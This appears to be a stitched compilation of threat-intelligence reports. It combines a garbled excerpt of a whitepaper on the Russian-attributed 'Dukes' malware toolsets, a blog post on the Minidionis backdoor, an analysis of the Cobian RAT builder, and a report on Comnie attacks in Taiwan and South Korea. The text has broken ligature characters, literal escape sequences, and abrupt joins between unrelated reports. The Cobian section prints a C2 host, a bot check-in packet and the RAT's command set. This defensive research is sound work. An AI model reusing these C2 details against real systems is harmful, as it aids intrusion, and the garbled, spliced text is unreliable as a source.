HammerDuke variant attempts to hide its network tra˛c in more legitimate use of Twitter. This method is not unique to HammerDuke , as MiniDuke , OnionDuke , and CozyDuke all support similar use of Twitter (image 9, above) to retrieve links to additional payloads or commands.2015: CloudDuke In the beginning of July 2015, the Dukes embarked on yet another large-scale phishing campaign. The malware toolset used for this campaign was the previously unseen CloudDuke and we believe that the July campaign marks the ˜rst time that this toolset was deployed by the Dukes, other than possible small-scale testing. The CloudDuke toolset consists of at least a loader, a downloader, and two backdoor variants. Both backdoors (internally referred to by their authors as ﬁBastionSolutionﬂ and ﬁOneDriveSolutionﬂ) essentially allow the operator to remotely execute commands on the compromised machine. The way in which each backdoor does so however is signi˜cantly di˚erent. While the BastionSolution variant simply retrieves commands from a hard-coded C&C server controlled by the Dukes, the OneDriveSolution utilizes Microsoft™s OneDrive cloud storage service for communicating with its masters, making it signi˜cantly harder for defenders to notice the tra˛c and block the communication channel. What is most signi˜cant about the July 2015 CloudDuke campaign is the timeline. The campaign appeared to consist of two distinct waves of spear-phishing, one during the ˜rst days of July and the other starting from the 20 th of the month. Details of the ˜rst wave, including a thorough technical analysis of CloudDuke , was published by Palo Alto Networks on 14 th July 16. This was followed by additional details from Kaspersky in a blog post published on 16 th July 17.Both publications happened before the second wave took place and received notable publicity. Despite the attention and public exposure of the toolset™s technical details (including IOCs) to defenders, the Dukes still continued with their second wave of spear-phishing, including the continued use of CloudDuke . The group did change the contents of the spear-phishing emails they sent, but they didn™t switch to a new email format; instead, they reverted to the same efax-themed format that they had previously employed, even to the point of reusing the exact same decoy document that they had used in the CozyDuke campaign a year earlier (July 2014). This once more highlights two crucial behavioral elements of the Dukes group. Firstly, as with the MiniDuke campaigns of February 2013 and CosmicDuke campaigns in the summer of 2014, again the group clearly prioritized the continuation of their operations over maintaining stealth. Secondly, it underlines their boldness, arrogance and self-con˜dence; they are clearly con˜dent in both their ability to compromise their targets even when their tools and techniques are already publicly known, and critically, they appear to be extremely con˜dent in their ability to act with impunity. 2015: Continuing surgical strikes with CosmicDuke In addition to the notably overt and large-scale campaigns with CozyDuke and CloudDuke , the Dukes also continued to engage in more covert, surgical campaigns using CosmicDuke . The latest of these campaigns that we are aware of occurred during the spring and early summer of 2015. As their infection vectors, these campaigns used malicious documents exploiting recently ˜xed vulnerabilities. Two of these campaigns were detailed in separate blog posts by the Polish security company Prevenity, who said that both campaigns targeted Polish entities with spear- phishing emails containing malicious attachments with relevant Polish language names 18 19 . A third, similar, CosmicDuke campaign was observed presumably targeting Georgian entities since it used an attachment with a Georgian-language name that translates to ﬁNATO consolidates control of the Black Sea.docxﬂ. Based on this, we do not believe that the Dukes are replacing their covert and targeted campaigns with the overt and opportunistic CozyDuke and CloudDuke style of campaigns. Instead, we believe that they are simply expanding their activities by adding new tools and techniques.

The PinchDuke information stealer gathers system con˛guration information, steals user credentials, and collects user ˛les from the compromised host transferring these via HTTP(S) to a C&C server. We believe PinchDuke™s credential stealing functionality is based on the source code of the Pinch credential stealing malware (also known as LdPinch) that was developed in the early 2000s and has later been openly distributed on underground forums. Credentials targeted by PinchDuke include ones associated with the following software or services: The Bat! Yahoo! Mail.ru Passport.Net Google Talk Netscape Navigator Mozilla Firefox Mozilla Thunderbird Internet Explorer Microsoft Outlook WinInet Credential Cache Lightweight Directory Access Protocol (LDAP) PinchDuke will also search for ˛les that have been created within a prede˛ned timeframe and whose ˛le extension is present in a prede˛ned list. TOOLS AND TECHNIQUES OF THE DUKES PINCHDUKE 17First known activity: January 2009 Most recent known activity: December 2012 Other names: N/A C&C communication methods: HTTP (S) Known toolset components: ˆ Loader ˆ Information stealer ˆ Multiple persistence components The GeminiDuke toolset consists of a core information stealer, a loader and multiple persistence-related components. Unlike CosmicDuke and PinchDuke, GeminiDuke primarily collects information on the victim computer™s con˛guration. The collected details include: Local user accounts Network settings Internet proxy settings Installed drivers Running processes Programs previously executed by users Programs and services con˛gured to automatically run at startup Values of environment variables Files and folders present in any users home folder Files and folders present in any users My Documents Programs installed to the Program Files folder Recently accessed ˛les, folders and programs As is common for malware, the GeminiDuke infostealer uses a mutex to ensure that only one instance of itself is running at a time. What is less common is that the name used for the mutex is often a timestamp. We believe these timestamps to be generated during the compilation of GeminiDuke from the local time of the computer being used. Comparing the GeminiDuke compilation timestamps, which always reference the time in the UTC+0 timezone, with the local time timestamps used as mutex names, and adjusting for the presumed timezone di˝erence, we note that all of the mutex names reference a time and date that is within seconds of the respective sample™s compilation timestamp. Additionally, the apparent timezone of the timestamps in all of the GeminiDuke samples compiled during the winter is UTC+3, while for samples compiled during the summer, it is UTC+4. The observed timezones correspond to the pre-2011 de˛nition of Moscow Standard Time (MSK) 20 , which was UTC+3 during the winter and UTC+4 during the summer. In 2011 MSK stopped following Daylight Saving Time (DST) and was set to UTC+4 year-round, then reset to UTC +3 year-round in 2014. Some of the observed GeminiDuke samples that used timestamps as mutex names were compiled while MSK still respected DST and for these samples, the timestamps perfectly align with MSK as it was de˛ned at the time. However, GeminiDuke samples compiled after MSK was altered still vary the timezone between UTC+3 in the winter and UTC+4 during the summer. While computers using Microsoft Windows automatically adjust for DST, changes in timezone de˛nitions require that an update to Windows be installed. We therefore believe that the Dukes group simply failed to update the computer they were using to compile GeminiDuke samples, so that the timestamps seen in later samples still appear to follow the old de˛nition of Moscow Standard Time. The GeminiDuke infostealer has occasionally been wrapped with a loader that appears to be unique to GeminiDuke and has never been observed being used with any of the other Duke toolsets. GeminiDuke also occasionally embeds additional executables that attempt to achieve persistence on the victim computer. These persistence components appear to be uniquely customized for use with GeminiDuke, but they use many of the same techniques as CosmicDuke persistence components.

This information stealer is augmented by a variety of components that the toolset operators may selectively include with the main component to provide additional functionalities, such as multiple methods of establishing persistence, as well as modules that attempt to exploit privilege escalation vulnerabilities in order to execute CosmicDuke with higher privileges. CosmicDuke™s information stealing functionality includes: Keylogging Taking screenshots Stealing clipboard contents Stealing user ˛les with ˛le extensions that match a prede˛ned list Exporting the users cryptographic certi˛cates including private keys Collecting user credentials, including passwords, for a variety of popular chat and email programs as well as from web browsers CosmicDuke may use HTTP, HTTPS, FTP or WebDav to ex˛ltrate the collected data to a hardcoded C&C server. While we believe CosmicDuke to be an entirely custom- written toolset with no direct sharing of code with other Duke toolsets, the high-level ways in which many of its features have been implemented appear to be shared with other members of the Duke arsenal. Speci˛cally, the techniques CosmicDuke uses to extract user credentials from targeted software and to detect the presence of analysis tools appear to be based on the techniques used by PinchDuke. Likewise, many of CosmicDuke™s persistence components use techniques also used by components associated with GeminiDuke and CozyDuke. In all of these cases, the techniques are the same, but the code itself has been altered to work with the toolset in question, leading to small di˝erences in the ˛nal implementation.A few of the CosmicDuke samples we discovered also included components that attempt to exploit either of the publicly known CVE-2010-0232 or CVE-2010- 4398 privilege escalation vulnerabilities. In the case of CVE-2010-0232, the exploit appears to be based directly on the proof of concept code published by security researcher Tavis Ormandy when he disclosed the vulnerability 4 . We believe that the exploit for CVE- 2010-4398 was also based on a publicly available proof of concept 21.In addition to often embedding persistence or privilege escalation components, CosmicDuke has occasionally embedded PinchDuke, GeminiDuke, or MiniDuke components. It should be noted that CosmicDuke does not interoperate with the second, embedded malware in any way other than by writing the malware to disk and executing it. After that, CosmicDuke and the second malware operate entirely independently of each other, including separately contacting their C&C servers. Sometimes, both malware have used the same C&C server, but in other cases, even the servers have been di˝erent. Finally, it is worth noting that while most of the compilation timestamps for CosmicDuke samples appear to be authentic, we are aware of a few cases of them being forged. One such case was detailed on page 10 as an apparent evasion attempt. Another is a loader variant seen during the spring of 2010 in conjunction with both CosmicDuke and PinchDuke. These loader samples all had compilation timestamps purporting to be from the 24 th or the 25 th of September, 2001. However, many of these loader samples embed CosmicDuke variants that exploit the CVE-2010- 0232 privilege escalation vulnerability thus making it impossible for the compilation timestamps to be authentic.

Additionally, a speci˛c loader is often associated with the MiniDuke toolset and is referred to as the ﬁMiniDuke loaderﬂ. While the loader has often been used together with other MiniDuke components, it has also commonly been used in conjunction with CosmicDuke and PinchDuke. In fact, the oldest samples of the loader that we have found were used with PinchDuke. To avoid confusion however, we have decided to continue referring to the loader as the ﬁMiniDuke loaderﬂ. Two details about MiniDuke components are worth noting. Firstly, some of the MiniDuke components were written in Assembly language. While many malware were written in Assembly during the ‚old days‚ of curiosity-driven virus writing, it has since become a rarity. Secondly, some of the MiniDuke components do not contain a hardcoded C&C server address, but instead obtain the address of a current C&C server via Twitter. The use of Twitter either to initially obtain the address of a C&C server (or as a backup if no hardcoded primary C&C server responds) is a feature also found in OnionDuke, CozyDuke, and HammerDuke.

This component can be instructed by the C&C server to download and execute arbitrary modules, and it is these modules that provide CozyDuke with its vast array of functionality. Known CozyDuke modules include: Command execution module for executing arbitrary Windows Command Prompt commands Password stealer module NT LAN Manager (NTLM) hash stealer module System information gathering module Screenshot module In addition to modules, CozyDuke can also be instructed to download and execute other, independent executables. In some observed cases, these executables were self-extracting archive ˛les containing common hacking tools, such as PSExec and Mimikatz, combined with script ˛les that execute these tools. In other cases, CozyDuke has been observed downloading and executing tools from other toolsets used by the Dukes such as OnionDuke, SeaDuke, and HammerDuke.

OnionDuke ˛rst caught our attention because it was being spread via a malicious Tor exit node. The Tor node would intercept any unencrypted executable ˛les being downloaded and modify those executables by adding a malicious wrapper contained an embedded OnionDuke. Once the victim ˛nished downloading the ˛le and executed it, the wrapper would infect the victim™s computer with OnionDuke before executing the original legitimate executable. The same wrapper has also been used to wrap legitimate executable ˛les, which were then made available for users to download from torrent sites. Again, if a victim downloaded a torrent containing a wrapped executable, they would get infected with OnionDuke. Finally, we have also observed victims being infected with OnionDuke after they were already infected with CozyDuke. In these cases, CozyDuke was instructed by its C&C server to download and execute OnionDuke toolset. Further reading 1.

SeaDuke is made interesting by the fact that it is written in Python and designed to be cross-platform so that it works on both Windows and Linux. The only known infection vector for SeaDuke is via an existing CozyDuke infection, wherein CozyDuke downloads and executes the SeaDuke toolset. Like HammerDuke, SeaDuke appears to be used by the Dukes group primarily as a secondary backdoor left on CozyDuke victims after that toolset has completed the initial infection and stolen any readily available information from them.

Speci˛cally, the only known infection vector for HammerDuke is to be downloaded and executed by CozyDuke onto a victim that has already been compromised by that toolset. This, together with HammerDuke™s simplistic backdoor functionality, suggests that it is primarily used by the Dukes group as a secondary backdoor left on CozyDuke victims after CozyDuke performed the initial infection and stole any readily available information from them. HammerDuke is however interesting because it is written in .NET, and even more so because of its occasional use of Twitter as a C&C communication channel. Some HammerDuke variants only contain a hardcoded C&C server address from which they will retrieve commands, but other HammerDuke variants will ˛rst use a custom algorithm to generate a Twitter account name based on the current date. If the account exists, HammerDuke will then search for tweets from that account with links to image ˛les that contain embedded commands for the toolset to execute. HammerDuke™s use of Twitter and crafted image ˛les is reminiscent of other Duke toolsets. Both OnionDuke and MiniDuke also use date-based algorithms to generate Twitter account names and then searched for any tweets from those accounts that linked to image ˛les. In contrast however, for OnionDuke and MiniDuke the linked image ˛les contain embedded malware to be downloaded and executed, rather than instructions. Similarly, GeminiDuke may also download image ˛les, but these would contain embedded additional con˛guration information for the toolset itself. Unlike HammerDuke however, the URLs for the images downloaded by GeminiDuke are hardcoded in its initial con˛guration, rather than retrieved from Twitter. Further reading 1.

These spear-phishing emails range from ones purposely designed to look like spam messages used to spread common crimeware and addressed to large numbers of people, to highly targeted emails addressed to only a few recipients (or even just one person) and with content that is highly relevant for the intended recipient(s). In some cases, the Dukes appear to have used previously compromised victims to send new spear-phishing emails to other targets. The spear-phishing emails used by the Dukes may contain either specially-crafted malicious attachments or links to URLs hosting the malware. When malicious attachments are used, they may either be designed to exploit a vulnerability in a popular software assumed to be installed on the victim™s machine, such as Microsoft Word or Adobe Reader, or the attachment itself may have its icon and ˜lename obfuscated in such a way that the ˜le does not appear to be an executable. The only instances which we are aware of where the Dukes did not use spear-phishing as the initial infection vector is with certain OnionDuke variants. These were instead spread using either a malicious Tor node that would trojanize legitimate applications on-the-˝y with the OnionDuke toolset, or via torrent ˜les containing previously trojanized versions of legitimate applications. Finally, it is worth noting that the Dukes are known to sometimes re-infect a victim of one of their malware tools with another one of their tools. Examples include CozyDuke infecting its victims with SeaDuke , HammerDuke ,or OnionDuke; and CosmicDuke infecting its victims with PinchDuke ,GeminiDuke or MiniDuke .DECOYS The Dukes commonly employ decoys with their infection vectors. These decoys may be image ˜les, document ˜les, Adobe Flash videos or similar that are presented to the victim during the infection process in an attempt to distract them from the malicious activity. The contents of these decoys range from non-targeted material such as videos of television commercials showing monkeys at an o˛ce, to highly targeted documents with content directly relevant to the intended recipient such as reports, invitations, or lists of participants to an event. Usually, the contents of the decoys appear to be taken from public sources, either by copying publicly accessible material such as a news report or by simply repurposing a legitimate ˜le that has been openly distributed. In some cases however, highly targeted decoys have been observed using content that does not appear to be publicly available, suggesting that these contents may have been stolen from other victims that had been infected by Duke toolsets. EXPLOITATION OF VULNERABILITIES The Dukes have employed exploits both in their infection vectors as well as in their malware. We are however only aware of one instance - the exploitation of CVE-2013-0640 to deploy MiniDuke - where we believe the exploited vulnerability was a zero-day at the time that the group acquired the exploit. In all known cases where exploits were employed, we believe the Dukes did not themselves discover the vulnerabilities or design the original exploits; for the exploited zero-day, we believe the Dukes purchased the exploit. In all other cases, we believe the group simply repurposed publicly available exploits or proofs of concept. 26ATTRIBUTION AND STATE˜SPONSORSHIP The Dukes appear to prioritize the continuation of their operations over stealth. Their 2015 CozyDuke and CloudDuke campaigns take this to the extreme by apparently opting for speed and quantity over stealth and quality. In the most extreme case, the Dukes continued with their July 2015 CloudDuke campaign even after their activity had been outed by multiple security vendors. We therefore believe the Dukes™ primary mission to be so valuable to their benefactors that its continuation outweighs everything else. This apparent disregard for publicity suggests, in our opinion, that the benefactors of the Dukes is so powerful and so tightly connected to the group that the Dukes are able to operate with no apparent fear of repercussions on getting caught. We believe the only benefactor with the power to o˚er such comprehensive protection would be the government of the nation from which the group operates. We therefore believe the Dukes to work either within or directly for a government, thus ruling out the possibility of a criminal gang or another third party. This leaves us with the ˜nal question: which country? We are unable to conclusively prove responsibility of any speci˜c country for the Dukes. All of the available evidence however does in our opinion suggest that the group operates on behalf of the Russian Federation. Further, we are currently unaware of any evidence disproving this theory. Kaspersky Labs has previously noted the presence of Russian-language artefacts in some of the Duke malware samples 9. We have also found a Russian-language error message in many PinchDuke samples: ﬁ ﬂ This roughly translates as, ﬁThere is an error in the module™s name! The length of the data section name must be 4 bytes!ﬂ Additionally, Kaspersky noted that based on the compilation timestamps, the authors of the Duke malware appear to primarily work from Monday to Friday between the times of 6am and 4pm UTC+0 11. This corresponds to working hours between 9am and 7pm in the UTC+3 time zone, also known as Moscow Standard Time, which covers, among others, much of western Russia, including Moscow and St. Petersburg. Attribution is always a di˛cult question, but attempting to answer it is important in understanding these types of threats and how to defend against them. This paper has already stated that we believe the Dukes to be a Russian state-sponsored cyberespionage operation. To reach this conclusion, we began by analyzing the apparent objectives and motivations of the group. Based on what we currently know about the targets chosen by the Dukes over the past 7 years, they appear to have consistently targeted entities that deal with foreign policy and security policy matters. These targets have included organizations such as ministries of foreign a˚airs, embassies, senates, parliaments, ministries of defense, defense contractors, and think tanks. In one of their more intriguing cases, the Dukes have appeared to also target entities involved in the tra˛cking of illegal drugs. Even such targets however appear to be consistent with the overarching theme, given the drug trade™s relevance to security policy. Based on this, we are con˜dent in our conclusion that the Dukes™ primary mission is the collection of intelligence to support foreign and security policy decision-making. This naturally leads to the question of state-sponsorship. Based on our establishment of the group™s primary mission, we believe the main benefactor (or benefactors) of their work is a government. But are the Dukes a team or a department inside a government agency? An external contractor? A criminal gang selling to the highest bidder? A group of tech-savvy patriots? We don™t know. Based on the length of the Dukes™ activity, our estimate of the amount of resources invested in the operation and the fact that their activity only appears to be increasing, we believe the group to have signi˜cant and most critically, stable ˜nancial backing. The Dukes have consistently operated large-scale campaigns against high-pro˜le targets while concurrently engaging in smaller, more targeted campaigns with apparent coordination and no evidence of unintentional overlap or operational clashes. We therefore believe the Dukes to be a single, large, well-coordinated organization with clear separation of responsibilities and targets. Map of timezones in Russia; © Eric Muller 23 Pink: MSK (UTC +3) ; Orange: UTC +4 27The Kaspersky Labs analysis of the Duke malware authors™ working times is supported by our own analysis, as well as that performed by FireEye 22 . This assertion of time zone is also supported by timestamps found in many GeminiDuke samples, which similarly suggest the group work in the Moscow Standard Time timezone, as further detailed in the section on the technical analysis of GeminiDuke (page 17). Finally, the known targets of the Dukes - Eastern European foreign ministries, western think tanks and governmental organizations, even Russian-speaking drug dealers - conform to publicly-known Russian foreign policy and security policy interests. Even though the Dukes appear to have targeted governments all over the world, we are unaware of them ever targeting the Russian government. While absence of evidence is not evidence of absence, it is an interesting detail to note. Based on the presented evidence and analysis, we believe, with a high level of con˜dence, that the Duke toolsets are the product of a single, large, well-resourced organization (which we identify as the Dukes) that provides the Russian government with intelligence on foreign and security policy matters in exchange for support and protection. 28BIBLIOGRAPHY 1.

9:12 am\\nYesterday our colleagues from Palo Alto Networks presented\\xa0their Minidionis research (also known by the Kaspersky name – “CloudLook”). It’s another backdoor from the APT group responsible for other attacks, such as CozyDuke , MiniDuke, and CosmicDuke.\\nAnalyzing this malware, we noticed that attackers implemented a cloud drive capability\\xa0to store malware and download them onto infected systems. Almost a\\xa0year ago, we observed another APT group named “CloudAtlas” using cloud drives to store stolen information. Now we see a similar technique in CloudLook/Minidionis.\\nMinidionis uses a multidropper scheme to infect its victims. First, to get in, this attacker uses spear-phishing emails with a self-extracting archive attachment pretending to be a voicemail. When the victim opens an archive, the second stage dropper executes and a .wav file plays looking like a real voicemail. In its spearphish, CloudLook also used a self-extracting archive containing a PDF file luring it’s victims with information regarding world terrorism:\\nAfter successful execution, the Minidionis second stage dropper uses Onedrive cloud storage to download a payload:\\nThe malware maps a Onecloud storage drive as a network drive using a hardcoded login and password, and then copies down its\\xa0cloud-stored backdoors\\xa0to the local system:\\nCould this approach become more mainstream? It’s quite possible, because it effectively gives the attackers a simple method of hiding malicious behavior. Detecting malicious traffic with legitimate\\xa0cloud services is more complicated, because\\xa0it means blocking legitimate services.\\nAccording to Kaspersky Security Network, each\\xa0attack using a Minidionis/CloudLook backdoor was specifically crafted for a particular target. This specificity demonstrates\\xa0that the attacks are highly customized and focused on valuable targets. So far, we’ve observed several targets, most notably European\\xa0diplomatic organizations.\\nKaspersky Lab detects all known samples of Minidionis/CloudLook as Trojan.Win32.Generic, and successfully protects its users against the threat.\\nAPT Targeted Attacks\\nShare post on:\\nFacebook\\nTwitter\\nRelated Posts\\nOperation AppleJeus Sequel\\nOilRig’s Poison Frog – old samples, same trick\\nAPT review: what the world’s threat actors got up to in 2019\\nLeave a Reply Cancel Reply\\nYour email address will not be published.

The RAT builder for this family was first advertised on multiple underground forums where cybercriminals often buy and sell exploit and malware kits. This RAT builder caught our attention as it was being offered for free and had lot of similarities to the njRAT/H-Worm family, which we analyzed in this report.\\nFigure 1: Cobian RAT command-and-control server application\\nAs shown in Figure 1, the Cobian RAT control panel and features are similar to that of njRAT and H-Worm. It is noteworthy that the author identified njRAT as the “theme.”\\nCrowdsourcing botnet model?\\nAs we analyzed the builder, we noticed a particularly interesting function: the builder kit is injected with a backdoor module\\xa0which retrieves C&C information from a predetermined URL (pastebin) that is controlled by the original author. This allows the\\xa0original author to control the systems infected by the malware payloads that were generated using this backdoored builder kit.\\nFigure 2 (click to enlarge): Crowdsourced botnet model – Cobian RAT\\nAs shown in Figure 2, the original author of the RAT builder kit is relying on second-level operators to build the RAT payload and spread infections. Then, thanks to the backdoor module, the original author can take full control of infected systems across all the Cobian RAT botnets in which the operators used the backdoored builder kit. The original author can also change the C&C server information configured by the second-level operators.\\nEvading detection by malware operator\\nDuring our analysis, we observed that when the machine name and username of the systems running the Cobian RAT payload (bot client) and the control server (bot C&C server) are the same, the backdoor module will not be activated and no communication will be sent to the backdoor C&C server.\\nThe original author of the RAT builder is assuming that there will be some testing performed by the second-level operators and that they will mostly likely use the same system for both bot client and server applications (C&C server of 127.0.0.1). To hide the presence of the backdoor module, there will be no traffic generated from the bot client to the backdoor C&C server in this case.\\nRecent in-the-wild Cobian RAT payload analysis\\nWe saw a unique Cobian RAT payload hit our Cloud Sandbox from a Pakistan-based defense and telecommunication solution website (potentially compromised). The executable payload was served inside a ZIP archive and was masquerading as a Microsoft Excel spreadsheet using an embedded icon, as shown in Figure 3.\\nFigure 3: Cobian RAT payload masquerading as Microsoft Excel spreadsheet file\\nThe executable payload is signed with an invalid digital certificate pretending to be from VideoLAN (Figure 4), creator of the well-known VLC media player.\\nFigure 4: Invalid digital certificate pretending to be from VideoLAN\\nThe executable file is packed using a .NET packer with the encrypted Cobian RAT payload embedded in the resource section. There is a series of anti-debugging checks performed by this dropper payload before decrypting the RAT and installing it on the victim’s system. The decompiled version of the RAT payload can be seen in Figure 5 below:\\nFigure 5: Cobian RAT — unpacked and decompiled\\nThe bot’s configuration details are present in Class B’s constructor as shown below:\\nFigure 6: Bot configuration details\\nThe bot attempts to create a MUTEX using the value of variable “VL” to ensure that only one instance of the bot is running. The bot will proceed to create a copy of itself as %TEMP%/svchost.exe, execute that file, and terminate itself. The newly executed copy will create an autostart registry key to ensure persistence upon system reboot.\\nThe bot contains many features that are also present in the njRAT, such as:\\nKeylogger\\nScreen capture\\nWebcam\\nVoice recorder\\nFile browser\\nRemote command shell\\nDynamic plugins\\nInstall/Uninstall\\nNetwork C&C activity\\nThe bot will spawn two threads in the background, one of which will be responsible for ensuring persistence and taking screenshots. The second thread will perform a regular check-in with the remote C&C server. The function “Data” is responsible for parsing the C&C server’s response and executing bot commands on the infected system, which can be seen below:\\nFigure 7: Bot “Data” function for parsing C&C response\\nThe C&C server address is stored in the configuration function (Figure 6) as a base64 encoded string. The C&C server for the payload that we analyzed pointed to a dynamic DNS domain, swez111.ddns.net:20000. Upon successful connection, the bot sends the following request to the C&C server to register the infected system and get further instructions.\\nEncrypted Data Sent\\nLOGIN|-|SGFja184MDUwMTY=|-|ODc4NDEyQHVzZXI=|-|TWljcm9zb2Z0IFdpbmRvd3MgWFAgUHJvZmVzc2lvbmFs|-|No|-|1.0.40.7|-|Tm90ZXBhZA==|-|U0dGamExODRNRFV3TVRZPSxzd2V6MTExLmRkbnMubmV0LDIwMDAwLHN2Y2hvc3QuZXhlLHtKRjJOTVJBTC00NjcxMzgtUU0yVVRZLVFNMlVUWUhTODd9LFRFTVAsVHJ1ZSxUcnVlLA==|-|2017-07-13\\nDecrypted data:\\nLOGIN|-|Hack_805016|-|email\\xa0protected|-|Microsoft Windows XP Professional|-|No|-|1.0.40.7|-|Notepad|-|SGFja184MDUwMTY=,swez111.ddns.net,20000,svchost.exe,{JF2NMRAL-467138-QM2UTY-QM2UTYHS87},TEMP,True,True,|-|2017-07-13\\nPacket Format\\nLOGIN|-|BotID|-|email\\xa0protected|-|OS|-|CAM|-|RAT Version|-|Installation Data|-|Infection Date\\nThe check-in packet includes information about the infected system such as machine name, username, operating system, BotID and configuration data of the payload installed, and the infection date.\\nBelow is a complete list of commands that the Cobian RAT supported in the payload we analyzed.\\nCommand\\nPurpose\\nLg\\nKeylogger\\nSvr|-|@\\nRename Bot/Campaign\\xa0ID\\nSvr|-|!\\nTerminate bot process\\nSvr|-|#\\nUninstall Bot\\nSvr|-|~\\nRestart Bot\\nSvr|-|$\\nUpdate C&C list\\nFLD\\nStress Tester (Flood using UDP or TCP Traffic)\\nExecute\\nUsed to run executable or script from local disk or remote URL\\nAc\\nSend Active Window Title\\nSc\\nSend Screen shot\\nmore|-|FM\\nFile Manager\\nmore|-|SM\\nSystem Manager\\nmore|-|CP\\nRemote Desktop\\nmore|-|CM\\nRemote Webcam\\nmore|-|MC\\nMicrophone\\nmore|-|NF\\nInformation\\nmore|-|CH\\nChat\\nmore|-|PS\\nPassword Stealer\\nmore|-|PT\\nPassTime (Send message box to infected machine)\\nC&C’s packet format\\nCommand|-|subcommand|-|subcommand arguments (optional based on command) |-|command data\\nConclusion\\nCobian RAT appears to be yet another RAT that is spawned\\xa0from the leaked njRAT code.

Comnie, first named by Sophos seemingly after the Windows LNK file name it created, is a custom malware family that is used in targeted attacks, and has been observed in the wild since at least April 2013. The Comnie malware family is notable in that it leverages online blogs and third-party services to obtain command and control (C2) information. Recent instances of the malware have been observed leveraging github.com, tumbler.com, and blogspot.com.\\nAttackers using Comnie are leveraging malicious macros that initially hide decoy documents and shows them when the victim enables macros. These decoys documents pertain to various subject matters that the targets would be likely to be interested in. The contents of these documents suggest that the main interests of threat actor likely included the organizations in the following industries, located in Taiwan:\\nTelecommunication\\nDefense\\nGovernment\\nHigh Tech\\nThe most recent attacks, in November 2017, likely targeted organizations in the following industries, located in South Korea:\\nAerospace\\nDefense\\nAdditionally, while researching this campaign, we identified historical attacks that appear to target the Taiwan government, an IT service vendor based in Asia, and a journalist of a Tibetan radio station.\\nActivities Involving Comnie\\nBeginning in mid of 2015, we observed the Comnie malware family delivered via malicious macros with various file names and decoy subject matters. Original file names, as well as information revealed within the decoy documents used by these samples provide clues as to who the targets may be. In the most recent attacks in November 2017, the information suggests that these attacks have most likely taken place against Aerospace and Defense industry targets in South Korea.\\nOriginal File Name\\nTranslation\\nDecoy\\nLocation\\nMost Likely Target\\n관계기관번호.xls\\nAffiliate numbers.xls\\nAffiliate phone numbers for a South Korean international airport\\nKR\\nAerospace\\nPBCS_관련_현황_보고.doc\\nPBCS_related_status_report.doc\\nReport on the status of Performance-Based Communication and Surveillance (PBCS)\\nKR\\nAerospace\\nDefense\\nThe following decoy contents are only shown to the victim after macros have been enabled:\\nFigure 1 Decoy document discussing an airport contact list in Korean\\nFigure 2 Decoy document discussing Performance Based Communication and Surveillance (PBCS)\\nBefore the attacks against South Korean targets, the same malicious macros were used to deliver the Comnie malware family to targets in Taiwan as early as 2015. Again, based on the original file names and the decoy contents, the most commonly witnessed targets in attacks that occurred in 2017 included those involving the Telecommunication, Defense, and High-Tech industries in Taiwan.\\nOriginal File Name\\nTranslation\\nDecoy\\nLocation\\nMost Likely Target\\n1060315 本部發言參考.doc\\n1060315 Headquarters Speech Reference.doc\\nDefense Industry Development Strategy\\nTW\\nDefense\\n轉給苦逼的網管兄弟.doc\\nPassing to cool fellow network administrators.doc\\nNetwork administration jokes\\nTW\\nHigh Tech\\nTelecommunication\\n2.SC OAM Firewall Policy_0306.xls\\n2.SC OAM Firewall Policy_0306.xls\\nNetwork topology diagrams\\nTW\\nHigh Tech\\nTelecommunication\\nFigure 3 Decoy document discussing Taiwan’s defense industry development strategy\\nFigure 4 Network firewall configuration description for a telecommunication company in Taiwan\\nFigure 5 Decoy document providing network topology information\\nIt is worth noting that in the attack that made use of the decoy document in Figure 4, the attacker also included related firewall logs and appears to have originated from a compromised an IT service vendor.\\nLooking at earlier attacks between 2013 and 2016, we believe Comnie was also used in targeted attacks against the following individuals or organizations:\\nTaiwan government\\nIT service vendor in Asia\\nJournalist of a Tibetan radio station\\nFigure 6 Email sent to Journalist of Tibetan radio station\\nMalicious Macros\\nThe malicious macro documents used to deliver Comnie initially hide the content inside and requests that the user enables macros prior to viewing the document. Once the user enables macros, the macro will perform the following actions:\\nDisplays decoy content\\nChecks for the existence of a file at %APPDATA%\\\\wscript.exe\\nIf %APPDATA%\\\\wscript.exe does not exist, the macro converts an embedded hex-encoded string into bytes and saves this data to the %APPDATA%\\\\wscript.exe.\\nExecutes the newly created wscript.exe payload\\nFigure 7 Example macro used to delivery Comnie\\nAn interesting discovery was made when examining the macros used to deliver Comnie. Based on evidence gleaned from both the macro and other data collected from the samples, it appears that the threat actor did not generate these documents from scratch. Instead, they appear to have been created based on an existing sample available via public sample repositories. The existing sample in question was created by a red team penetration tester at a financial institution for internal testing. The following image shows a comparison of macro code extracted from Comnie dropper and financial institution’s penetration test sample.\\nFigure 8 Comparison of macros extracted from Comnie dropper versus a pentest sample used by a financial organization\\nComnie Malware Family\\nComnie uses the RC4 algorithm in multiple locations both to obfuscate strings used by the malware, as well as for network communication. Additionally, the malware looks for multiple security products on victim machines and sometimes alters its behavior depending on the products present. More information about how Comnie handles identified security products may be found in the technical analysis in the Appendix. These security products included those that are known to be most widely used within South Korea and Taiwan.\\nComnie is able to achieve persistence via a .lnk file that is stored within the victim’s startup path. When originally run, Comnie will convert itself from an executable file to a DLL and will write this newly created DLL to the host machine’s %APPDATA% directory. The built-in Windows utility rundll32.exe is then used to load this DLL by the original .lnk file.\\nUnit 42 has observed a total of two variants of Comnie. One of the ways the variants differ is in how they obtain their command and control (C2) information. Both variants make use of third-party online services in an attempt to prevent DNS based blocking of their first stage communications. However, the obfuscation mechanism varies slightly. In older variants, Comnie was found to look for the ‘++a++’ markers. The example C2s used by older variants of Comnie demonstrates this:\\nFigure 9 Old Comnie variants collecting C2 information\\nPlease refer to the Appendix for a script that may be used to decode C2 information from the older Comnie variants.\\nNewer Comnie variants, such as the ones witnessed in the most recent attacks, instead look for the ‘magnet:/’ and ‘?’ markers, such as in the following recent example:\\nFigure 10 New Comnie variants determining their C2 information via a GitHub profile.\\nAfter Comnie collects the remote C2 information, it will communicate with these remote servers using HTTP requests. These requests are encrypted using the RC4 algorithm. Comnie will upload information about the victim. It also allows the attacker to provide and subsequently execute a batch script (BAT), executable file (EXE), or dynamic-link library (DLL).\\nMore detailed information about how C2 information is decoded and additional technical analysis of Comnie may be found in the Appendix.\\nConclusion\\nComnie is far from a new threat, however, it continues to remain active. In the past year, we have observed multiple low volume attacks in various regions of East Asia. Based on clues provided by the malware’s original file names, as well as the decoy content embedded within these samples, we can make a reasonable estimation that these attacks targeted organizations in Taiwan in the Telecommunication, Defense, Government, and High-Tech industries. Additionally, those same estimations may be made for attacks in South Korea targeting the Aerospace and Defense industries.\\nWhile we have witnessed modifications to the attacker’s toolsets, the overall architecture and operations of the Comnie 